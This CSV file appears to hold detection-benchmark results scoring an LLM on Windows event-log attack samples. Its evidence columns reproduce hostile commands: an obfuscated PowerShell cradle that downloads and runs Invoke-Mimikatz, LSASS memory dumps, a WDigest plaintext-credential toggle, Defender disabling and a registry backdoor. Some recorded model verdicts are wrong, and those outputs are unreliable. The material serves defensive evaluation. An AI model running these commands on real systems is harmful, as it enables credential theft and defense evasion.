# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","j.varela, test10, SRV1103$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami",,,0.0,5.53,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4648, 4624, 4688
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
- Accounts: j.varela, test10, SRV1103$
- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
- Network: None
- Registry: None

EXPLANATION:
The sequence begins with Event ID 1102, indicating the Security log was cleared by user 'j.varela', which is a common anti-forensic technique to hide subsequent actions. Immediately following this, the same user performs a logon as 'test10' via PowerShell and executes 'whoami' commands, suggesting an attempt to verify identity or establish a foothold after attempting to erase audit trails. This combination of log clearing and immediate command execution under a different account context is highly indicative of malicious activity."
Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","MSFRottenPotato.exe, cmd.exe, conhost.exe","t.okafor, ANONYMOUS LOGON, SRV2207$","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff",127.0.0.1,,0.0,5.21,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4624, 4688, 4688
- Processes: MSFRottenPotato.exe, cmd.exe, conhost.exe
- Accounts: t.okafor, ANONYMOUS LOGON, SRV2207$
- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: 127.0.0.1
- Registry: None

EXPLANATION:
The logs show the execution of MSFRottenPotato.exe, a known privilege escalation tool, followed by the spawning of cmd.exe and conhost.exe with elevated privileges (TokenElevationType %%1936/%%1937). The sequence includes clearing the security event log (Event ID 1102) by user 't.okafor', which is a common anti-forensic technique to hide such attacks. The presence of an ANONYMOUS LOGON and the use of NTLM authentication from localhost further indicate suspicious activity consistent with privilege escalation attempts."
Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4648, 4624, 4672","runas.exe, svchost.exe, cmd.exe, conhost.exe, ctfmon.exe","j.varela, t.okafor, SRV1103$","runas  /user:corpnb\t.okafor cmd.exe , cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe",::1,,0.0,5.84,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4624, 4672
- Processes: runas.exe, svchost.exe, cmd.exe, conhost.exe, ctfmon.exe
- Accounts: j.varela, t.okafor, SRV1103$
- Commands: runas  /user:corpnb\t.okafor cmd.exe , cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
- Network: ::1
- Registry: None

EXPLANATION:
The sequence shows an attacker clearing security logs (Event ID 1102) to hide activity, followed by using `runas` to spawn a `cmd.exe` session under the `t.okafor` account. This is followed by a high-privilege logon (Event ID 4672) granting `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, indicating privilege escalation and potential system compromise."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104-Registry permission change via WMI (DAMP) PowerShell on source.evtx,hard,C,processed,YES,100.0,100.0,YES,"800, 4104, 4103",powershell.exe,CORPNB\t.okafor,"Add-RemoteRegBackdoor -ComputerName SRV1103 -Trustee 'S-1-1-0', prompt",,"SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account",0.0,71.19,6.0,5.0,4.0,2,17.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: powershell.exe
- Accounts: CORPNB\t.okafor
- Commands: Add-RemoteRegBackdoor -ComputerName SRV1103 -Trustee 'S-1-1-0', prompt
- Network: None
- Registry: SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg, SYSTEM\CurrentControlSet\Control\Lsa\JD, SYSTEM\CurrentControlSet\Control\Lsa\Skew1, SYSTEM\CurrentControlSet\Control\Lsa\Data, SYSTEM\CurrentControlSet\Control\Lsa\GBG, SECURITY, SAM\SAM\Domains\Account

EXPLANATION:
The logs show the execution of the `Add-RemoteRegBackdoor` script, which is a known offensive tool used to modify registry permissions to create a persistent backdoor. The activity involves granting `ALL_ACCESS` to the `Everyone` group (SID `S-1-1-0`) on sensitive registry keys such as `SAM`, `SECURITY`, and `LSA`, which allows any user to read or modify critical security credentials and configuration data. This constitutes a clear persistence and privilege escalation attempt."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104 Defender critical features disabled (PowerShell).evtx,hard,C,processed,YES,100.0,75.0,YES,"800, 4103, 4104",powershell.exe,CORPNB\j.varela,"Set-MpPreference -DisableRealtimeMonitoring $true, Set-MpPreference -DisableIOAVProtection $true, Set-MpPreference -DisableBehaviorMonitoring $true, Set-MpPreference -DisableIntrusionPreventionSystem $true, Set-MpPreference -DisableInboundConnectionFiltering $true",,,0.0,30.63,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: powershell.exe
- Accounts: CORPNB\j.varela
- Commands: Set-MpPreference -DisableRealtimeMonitoring $true, Set-MpPreference -DisableIOAVProtection $true, Set-MpPreference -DisableBehaviorMonitoring $true, Set-MpPreference -DisableIntrusionPreventionSystem $true, Set-MpPreference -DisableInboundConnectionFiltering $true
- Network: None
- Registry: None

EXPLANATION:
The logs show a sequence of PowerShell commands executed by the user `CORPNB\j.varela` that systematically disable multiple core security features of Microsoft Defender, including Real-time Monitoring, IOAV Protection, Behavior Monitoring, and Network Protection. This pattern of disabling antivirus and firewall protections via `Set-MpPreference` is a classic indicator of defense evasion, often performed by malware or attackers to prevent detection of subsequent malicious activities."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4688-5447-4950-Firewall disabled (command).evtx,hard,C,error,NO,0.0,0.0,NO,,,,,,,,0.41,,,,,,,Error: HTTP 400
Qwen3.8-Flash-Next-MLX-Serve-4bit,"ID4742,4935,4662,4661,5137-DCshadow attack (GLOBAL) failed.csv",,,processed,NO,100.0,50.0,YES,"4662, 4742, 4935, 5137, 5136, 4936, 4929",,"j.varela, SRV3308$",,srv3308.corp-nb.example,,0.0,9.81,3.0,1.0,4.0,3,11.0,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4662, 4742, 4935, 5137, 5136, 4936, 4929
- Processes: None
- Accounts: j.varela, SRV3308$
- Commands: None
- Network: srv3308.corp-nb.example
- Registry: None

EXPLANATION:
The logs show the account 'j.varela' performing standard Active Directory replication and object modification tasks, specifically updating Service Principal Names (SPNs) for the computer account 'SRV3308$'. These events (4662, 4742, 5136, 5137) are consistent with legitimate administrative maintenance or automated synchronization processes rather than malicious privilege escalation or unauthorized access. There are no indicators of compromise such as suspicious command execution, lateral movement, or data exfiltration."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4103-4104-CrackMapExec payload execution.evtx,medium,A,processed,YES,100.0,69.4,YES,"4104, 4103",powershell.exe,CORPNB\j.varela,"powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A114A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99A97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) )",172.19.123.11,,0.0,140.06,4.2,6.0,4.0,3,17.2,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4104, 4103
- Processes: powershell.exe
- Accounts: CORPNB\j.varela
- Commands: powershell.exe -exec bypass -noni -nop -w 1 -C . ( $PsHoME[4]+$PsHoME[34]+'X')(  $(Sv 'Ofs' '' ) +[StriNG]('91A78}101d116,46t83d101A114d118A105A99A101W80N111N105N110N116d77}97A110z97}103z101A114N93,58A58N83d101}114}118t101t114}67A101t114A116N105W102}105,99A97t116}101,86}97}108W105W100z97}116,105}111}110W67,97N108A108}98}97}99A107,32A61t32N123t36}116,114A117}101A125N10A116A114A121}123}10}91}82W101W102A93A46d65}115,115}101d109t98,108t121t46}71z101N116N84t121z112d101d40t39z83N121d115z39}43z39t116N101A109d46}77d97d110N39A43z39W97d103W101W109t101}110N116W46d65A117z116z39W43d39}111d109A97z116}105A111z110z46W65A109}39z43A39}115t105}85t116}39N43z39d105A108A115t39z41N46W71W101}116z70d105N101A108t100,40}39,97}109d39A43W39z115}105}73d110}105}39d43t39A116t70t97N105N108}101d100A39z44z32N39W78A111A110z80W39z43d39,117t98N108}105t99}44N83,116W97}39}43A39}116W105,99W39}41z46A83N101,116z86d97}108t117N101z40A36N110d117A108A108z44N32}36}116}114,117A101N41W10,125,99}97A116A99,104d123t125A10}91t78t101}116,46,83d101W114z118}105N99A101d80A111,105t110}116W77,97N110d97,103A101}114W93}58t58}83A101d114z118t101A114A67N101W114d116,105N102d105N99}97,116W101z86t97}108}105A100A97,116z105A111z110}67W97d108d108}98}97z99,107N32N61,32,123}36d116t114}117}101N125}10N91A83}121,115A116}101z109A46}78}101W116N46A83}101,114,118,105}99N101,80,111A105z110A116A77A97,110N97t103t101t114}93}58d58t83N101t99,117d114z105A116d121,80}114,111}116,111}99A111W108W32}61A32W91W83z121W115}116t101}109d46}78A101t116N46t83N101A99}117d114W105d116A121}80d114W111t116z111}99d111z108}84z121N112z101,93A39,83A115z108,51d44W84}108z115A44N84A108t115A49W49N44,84}108}115N49d50,39W10t73t69t88W32}40A78A101A119A45A79d98d106t101z99}116A32W78}101W116t46}87,101N98A67,108A105d101}110d116,41A46z68d111N119N110z108A111}97A100z83t116A114A105A110,103,40A39d104d116N116N112A115t58A47N47z49}48z46,50}51A46}49d50t51N46}49A49A58N52}52}51W47}73W110A118}111A107}101N45t77}105A109}105,107W97t116z122z46,112t115}49A39,41d10t36d99t109z100t32W61d32t73}110,118,111}107d101W45W77z105}109}105,107d97z116d122W32d45t67z111A109W109}97d110t100t32A39,112A114}105N118W105}108N101}103z101N58,58t100d101t98z117t103W32W115W101}107t117d114z108A115}97,58N58W108A111A103A111}110A112A97A115N115z119d111}114d100A115N32N101,120}105}116z39}10,36A114}101z113d117N101}115t116N32d61t32A91}83d121A115W116W101d109t46N78t101A114A46}87z101W98z82t101W113d117A101t115d116d93d58N58W67,114}101d97A116}101z40}39N104N116}116t112,115W58t47d47N49A48d46}50A51A46}49,50N51N46}49A49,58t52d52}51}47}39}41A10z36N114}101z113z117N101A115W116A46d77t101W116W104A111t100,32,61z32,39d80,79,83W84d39z10}36t114A101t113d117W101t115N116z46d67}111A110t116z101z110}116t84d121}112A101}32A61t32A39z97d112W112W108}105,99A97d116t105}111z110z47}120}45A119t119z119}45N102,111N114}109A45d117A114t108z101N110A99A111}100}101A100z39A10t36z98}121,116A101z115A32A61}32}91N83}121A115W116N101d109A46}84}101W120N116}46N69,110}99W111W100}105t110,103A93,58A58z65z83W67d73t73W46A71N101}116t66}121,116A101}115A40,36N99A109A100A41z10A36A114z101A113}117,101N115A116W46,67d111d110z116z101t110A116}76}101z110t103}116A104,32}61t32N36d98,121N116z101}115N46}76z101N110,103z116W104}10A36d114d101A113N117}101A115d116}83z116A114A101,97N109z32,61}32}36}114W101t113N117,101W115A116}46A71}101W116A82z101A113A117N101t115N116t83A116A114}101d97d109}40}41t10z36A114t101d113A117}101A115A116A83N116}114d101}97W109A46,87z114d105,116A101,40}36W98N121z116z101t115}44A32z48}44d32}36A98W121t116A101}115W46,76N101t110W103}116,104t41d10A36z114N101}113A117}101}115d116}83A116N114t101W97W109W46,67}108}111}115d101t40t41A10z36W114}101t113t117N101A115N116t46d71t101W116}82W101z115}112}111A110d115}101}40,41'.SPlIT('Nz}tAdA,}W') | ForEach-ObJEct { ([int] $_ -AS [ChAR]) } ) +$( set-itEM 'VaRiAble:Ofs' ' ' ) )
- Network: 172.19.123.11
- Registry: None

EXPLANATION:
The logs show PowerShell executing a heavily obfuscated command that attempts to download and execute `Invoke-Mimikatz.ps1` from an external IP address (172.19.123.11). The script explicitly attempts to disable SSL certificate validation and set security protocols to weak versions (SSL3, TLS1.0/1.1/1.2) to bypass security controls. The activity was blocked by antivirus software, confirming the malicious nature of the credential theft tool invocation."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104 Defender exclusion added (PowerShell).evtx,medium,C,processed,YES,100.0,75.0,YES,"800, 4103, 4104",powershell.exe,CORPNB\j.varela,"Set-MpPreference -ExclusionPath c:\document\virus\, Set-MpPreference -ExclusionExtension '.exe', PSConsoleHostReadLine, Out-Default, Set-StrictMode -Off",,,0.0,11.15,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: powershell.exe
- Accounts: CORPNB\j.varela
- Commands: Set-MpPreference -ExclusionPath c:\document\virus\, Set-MpPreference -ExclusionExtension '.exe', PSConsoleHostReadLine, Out-Default, Set-StrictMode -Off
- Network: None
- Registry: None

EXPLANATION:
The logs show the user `CORPNB\j.varela` executing `Set-MpPreference` commands to add exclusions for a path named `c:\document\virus\` and the `.exe` file extension. This activity is a common technique used by attackers to disable Windows Defender protections and allow malicious executables to run without detection. The sequential execution of these commands within a short timeframe indicates a deliberate attempt to evade security controls."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID5145-4624-DonPAPI full extraction.csv,,,error,NO,0.0,0.0,NO,,,,,,,,0.16,,,,,,,Error: HTTP 400
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID1-12-13-Wdigest authentication activation.evtx,easy,A,processed,YES,100.0,90.0,YES,"1, 12, 13","reg.exe, cmd.exe",CORPNB\j.varela,"reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1, ""C:\Windows\system32\cmd.exe""",,"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential",0.0,4.55,5.4,5.0,4.0,3,17.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 12, 13
- Processes: reg.exe, cmd.exe
- Accounts: CORPNB\j.varela
- Commands: reg  add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1, ""C:\Windows\system32\cmd.exe"" 
- Network: None
- Registry: HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest, HKLM\System\CurrentControlSet\Control\SecurityProviders\WDigest\UseLogonCredential

EXPLANATION:
The logs show the modification of the WDigest registry key to enable `UseLogonCredential`, a technique commonly used to store plaintext credentials in memory for subsequent dumping. This activity is explicitly flagged by Sysmon rules for Credential Dumping (T1003) and Registry Modification (T1112), indicating a clear attempt to facilitate credential theft."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID1-LSASS dump with LSASSY (SYSMON).evtx,easy,B,processed,YES,100.0,68.9,YES,"18, 1, 7, 11, 10","wmiprvse.exe, powershell.exe, rundll32.exe, lsass.exe",CORPNB\j.varela,"powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full | Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full",,,0.0,8.62,4.1,6.0,4.0,4,18.1,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 18, 1, 7, 11, 10
- Processes: wmiprvse.exe, powershell.exe, rundll32.exe, lsass.exe
- Accounts: CORPNB\j.varela
- Commands: powershell.exe -NoP -C ""C:\Windows\System32\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).Id \Windows\Temp\76nivOxA.dmp full;Wait-Process -Id (Get-Process rundll32).id"", ""C:\Windows\System32\rundll32.exe""  C:\Windows\System32\comsvcs.dll MiniDump 512 \Windows\Temp\76nivOxA.dmp full
- Network: None
- Registry: None

EXPLANATION:
The logs show a clear attempt to dump the Local Security Authority Subsystem Service (LSASS) memory using `comsvcs.dll` via `rundll32.exe`, a common technique for stealing credentials. This activity was initiated by `powershell.exe` spawned from `wmiprvse.exe`, indicating potential lateral movement or remote execution. The creation of the dump file `C:\Windows\Temp\76nivOxA.dmp` confirms the successful execution of this malicious command."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID10-Mimikatz LSASS process dump.evtx,easy,A,processed,YES,100.0,100.0,YES,"1, 10","mimikatz.exe, cmd.exe, lsass.exe","CORPNB\j.varela, NT AUTHORITY\SYSTEM","mimikatz.exe, ""C:\Windows\system32\cmd.exe"" , cmd.exe",,,0.0,4.33,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 10
- Processes: mimikatz.exe, cmd.exe, lsass.exe
- Accounts: CORPNB\j.varela, NT AUTHORITY\SYSTEM
- Commands: mimikatz.exe, ""C:\Windows\system32\cmd.exe"" , cmd.exe
- Network: None
- Registry: None

EXPLANATION:
The logs show the execution of `mimikatz.exe`, a well-known credential dumping tool, followed by a process access event where `mimikatz.exe` accessed `lsass.exe` with `GrantedAccess` `0x1010` (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION). This sequence indicates an attempt to dump credentials from the Local Security Authority Subsystem Service, which is a definitive indicator of credential theft and malicious activity."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID11-LSASS credentials dump via Task Manager.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\System32\Taskmgr.exe,j.varela,,,,0.0,2.45,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 11
- Processes: C:\Windows\System32\Taskmgr.exe
- Accounts: j.varela
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The creation of an LSASS memory dump file (`lsass (4).DMP`) by `Taskmgr.exe` is a strong indicator of credential harvesting, as attackers often use Task Manager to dump LSASS memory to extract credentials. This activity is not typical for routine administrative tasks and suggests an attempt to steal sensitive authentication data."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID11-Mimikatz LSA SSP clear text password exfiltration.evtx,easy,A,processed,YES,100.0,100.0,YES,11,C:\Windows\system32\lsass.exe,,,,,0.0,2.51,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 11
- Processes: C:\Windows\system32\lsass.exe
- Accounts: None
- Commands: None
- Network: None
- Registry: None

EXPLANATION:
The creation of `C:\Windows\System32\mimilsa.log` by `lsass.exe` is a strong indicator of credential dumping using Mimikatz, as this file is a known artifact of that tool. The associated MITRE ATT&CK technique T1003 (OS Credential Dumping) confirms the malicious intent of accessing LSASS memory to steal credentials."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID800-4103-4104-Firewall configuration enumerated (PowerShell).evtx,hard,C,error,NO,0.0,0.0,NO,,,,,,,,0.53,,,,,,,Error: HTTP 400
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID4103-4104 - SPN discovery (moder nPowerShell).evtx,hard,C,processed,YES,100.0,75.0,YES,"4104, 4103, 4100",powershell.exe,CORPNB\j.varela,"$SPNName = 'MSSQLSvc/Svc-SQL-DB01.corp-nb.example', Add-Type -AssemblyNAme System.IdentityModel, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName",,,0.0,9.03,4.5,6.0,4.0,3,17.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4104, 4103, 4100
- Processes: powershell.exe
- Accounts: CORPNB\j.varela
- Commands: $SPNName = 'MSSQLSvc/Svc-SQL-DB01.corp-nb.example', Add-Type -AssemblyNAme System.IdentityModel, New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
- Network: None
- Registry: None

EXPLANATION:
The logs show the user `CORPNB\j.varela` executing PowerShell commands to load the `System.IdentityModel` assembly and attempt to create a `KerberosRequestorSecurityToken` for a specific SQL Service Principal Name (SPN). This sequence of commands is characteristic of a Kerberoasting attack, where an attacker requests service tickets for service accounts to crack their passwords offline. The error message indicating a failure to create the Kerberos credential confirms the attempt to request a service ticket for the target service."
Qwen3.8-Flash-Next-MLX-Serve-4bit,ID6004-DNS-server-failed zone transfer.evtx,easy,A,processed,YES,100.0,90.0,YES,6004,,,,"172.19.23.9, non-existing.lan., google.com., hacking-zone.lan.",,0.0,3.06,5.4,6.0,4.0,2,17.4,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 6004, 6004, 6004
- Processes: None
- Accounts: None
- Commands: None
- Network: 172.19.23.9, non-existing.lan., google.com., hacking-zone.lan.
- Registry: None

EXPLANATION:
The logs show a single source IP (172.19.23.9) querying a non-existent domain followed by a known malicious domain (""hacking-zone.lan"") within a short timeframe, which is indicative of DNS tunneling or C2 communication attempts. The progression from a non-existing domain to a specific attacker-associated domain suggests an attempt to establish a covert channel or resolve malicious infrastructure."
